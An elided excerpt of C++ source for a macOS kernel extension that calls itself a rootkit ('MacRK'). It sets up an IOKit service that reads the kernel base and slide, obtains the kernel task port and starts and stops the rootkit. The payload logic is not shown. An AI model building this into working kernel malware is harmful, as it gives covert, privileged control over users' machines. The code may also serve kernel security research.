...
OSDefineMetaClassAndStructors(IOKernelDarwinKitService, IOService)
    ...
    DARWIN_RK_LOG("MacRK::IOKernelDarwinKitService::init()!\n");
...
bool IOKernelDarwinKitService::start(IOService* provider) {
    ...
    if (keep_syms) {
        ...
        DARWIN_RK_LOG("MacRK::IOKernelDarwinKitService::start()!\n");

        snprintf(buffer, 128, "0x%llx", kernel_base);

        DARWIN_RK_LOG("MacRK::IOKernelDarwinKitService::kernel_base = %s\n", buffer);

        snprintf(buffer, 128, "0x%llx", kernel_slide);

        DARWIN_RK_LOG("MacRK::IOKernelDarwinKitService::kernel_slide = %s\n", buffer);

        snprintf(buffer, 128, "0x%x", *(UInt32*)kernel_base);

        DARWIN_RK_LOG("MacRK::@ kernel base = %s\n", buffer);

        if (kernel_base && kernel_slide) {
            kernel = xnu::Kernel::create(kernel_base, kernel_slide);

            kernel->setRootKitService(this);

            tfp0 = kernel->getKernelTaskPort();

            ret = mac_rootkit_start(this, kernel, &rootkitKext);

            if (ret == kIOReturnSuccess) {
                rootkit = mac_rootkit_get_rootkit();
            }

            registerService();
        }
    } else {
        DARWIN_RK_LOG("MacRK::failed to load! Please enable keepsyms=1 as a boot-arg in NVRAM!\n");
...
void IOKernelDarwinKitService::stop(IOService* provider) {
    ...
    ret = mac_rootkit_stop(this, kernel, &rootkitKext);
